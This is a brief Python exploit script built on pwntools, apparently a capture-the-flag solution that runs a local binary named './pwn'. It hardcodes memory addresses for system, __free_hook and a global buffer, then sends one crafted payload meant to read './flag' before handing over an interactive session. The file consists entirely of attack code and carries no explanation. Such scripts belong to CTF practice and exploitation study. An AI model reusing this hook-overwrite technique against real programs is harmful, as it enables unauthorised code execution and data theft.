#!/usr/bin/python

from pwn import *
context.log_level = "debug"
r = process('./pwn')
#gdb.attach(r)
#raw_input()
#jia 40
g = 0x701580
system = 0x421080
free_hook = 0x6FFEC8
s = 0x7015B8
#0x4EE510 mov rsi, rax
#payload one
pay = "1./flag.13.1.r.13.30.40.13.1.36.13.1.0x701580.13.31.1.0x701580.42."
r.sendline(pay)
r.interactive()
